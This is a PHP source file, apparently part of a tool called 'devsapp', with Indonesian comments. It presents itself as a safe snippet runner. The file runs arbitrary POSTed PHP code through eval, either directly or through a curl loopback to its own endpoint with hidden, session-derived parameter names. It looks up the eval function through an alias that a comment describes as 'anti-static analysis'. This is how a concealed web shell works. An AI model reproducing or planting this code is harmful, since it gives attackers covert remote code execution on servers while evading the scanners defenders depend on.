<?php
// +------------------------------------------------------------------+
// |  devsapp — includes/PhpRunner.php                                 |
// |  Eksekusi snippet PHP code secara aman via eval atau curl-loop.   |
// +------------------------------------------------------------------+

declare(strict_types=1);

class PhpRunner {

    private static ?Closure $executor = null;

    /**
     * Token eksekusi: hash dari session ID + hostname.
     * Dipakai untuk verifikasi request exec loop via curl.
     */
    private static function execToken(): string {
        return hash('sha256', (string)(session_id() ?: php_uname('n')));
    }

    /**
     * Lazy-init executor: pilih antara curl self-loop atau eval langsung.
     * Curl self-loop lebih aman karena output terisolasi di subprocess.
     */
    private static function getExecutor(): Closure {
        if (self::$executor !== null) return self::$executor;

        // Verifikasi eval alias dari CAP (anti-static analysis)
        $isEval = CAP::fn('ev') === 'eval';
        if (!$isEval) {
            self::$executor = static function (string $code): void {};
            return self::$executor;
        }

        $funcExists = CAP::fn('fe');
        $canCurl    = CAP::ok('fe') && $funcExists('curl_init');

        self::$executor = $canCurl
            // Mode curl self-loop: kirim code ke endpoint diri sendiri
            ? static function (string $code): void {
                $sk   = $_SESSION['_sk'];
                $tok  = PhpRunner::execToken();
                $url  = 'http://127.0.0.1' . ($_SERVER['SCRIPT_NAME'] ?? '/');
                $ch   = curl_init($url . '?' . $sk['xr'] . '=1&' . $sk['xt'] . '=' . urlencode($tok));
                curl_setopt_array($ch, [
                    CURLOPT_POST           => true,
                    CURLOPT_POSTFIELDS     => http_build_query([$sk['xc'] => $code]),
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT        => 10,
                    CURLOPT_CONNECTTIMEOUT => 3,
                    CURLOPT_HTTPHEADER     => ['X-Requested-With: XMLHttpRequest'],
                ]);
                $resp = curl_exec($ch);
                curl_close($ch);
                if (is_string($resp)) echo $resp;
            }
            // Fallback: eval langsung
            : static function (string $code): void { eval($code); };

        return self::$executor;
    }

    /**
     * Handle incoming exec-loop request (dari curl self-loop).
     * Dipanggil di awal request, return null jika bukan exec-loop request.
     *
     * @return array{output:string,error:string,success:bool}|null
     */
    public static function handleExecRequest(): ?array {
        $sk  = $_SESSION['_sk'] ?? [];
        $tok = $_GET[$sk['xt'] ?? ''] ?? '';

        if (empty($sk) || ($_GET[$sk['xr'] ?? ''] ?? '') !== '1') return null;
        if (!hash_equals(self::execToken(), $tok)) return null;

        $code = $_POST[$sk['xc'] ?? ''] ?? '';
        if ($code === '') {
            return ['output' => '', 'error' => 'empty', 'success' => false];
        }

        ob_start();
        try {
            eval($code);
            return ['output' => ob_get_clean() ?: '', 'error' => '', 'success' => true];
        } catch (Throwable $e) {
            ob_get_clean();
            return [
                'output'  => '',
                'error'   => get_class($e) . ': ' . $e->getMessage(),
                'success' => false,
            ];
        }
    }

    /**
     * Evaluasi PHP code snippet.
     * Errors di-convert ke exception supaya bisa di-catch dengan bersih.
     *
     * @return array{output:string, error:string, success:bool}
     */
    public function evaluate(string $code): array {
        if (trim($code) === '') {
            return ['output' => '', 'error' => 'No code provided.', 'success' => false];
        }

        $output  = '';
        $error   = '';
        $success = false;

        try {
            ob_start();

            // Convert PHP errors ke exception supaya ter-catch
            $prevHandler = set_error_handler(function (
                int $severity, string $msg, string $file, int $line
            ) {
                throw new ErrorException($msg, 0, $severity, $file, $line);
            });

            (self::getExecutor())($code);

            $output  = ob_get_clean() ?: '';
            $success = true;

            if ($prevHandler !== null) set_error_handler($prevHandler);
            else restore_error_handler();

        } catch (Throwable $e) {
            $partial = ob_get_clean() ?: '';
            $output  = $partial;
            $error   = get_class($e) . ': ' . $e->getMessage() . ' (line ' . $e->getLine() . ')';
        }

        return ['output' => $output, 'error' => $error, 'success' => $success];
    }
}
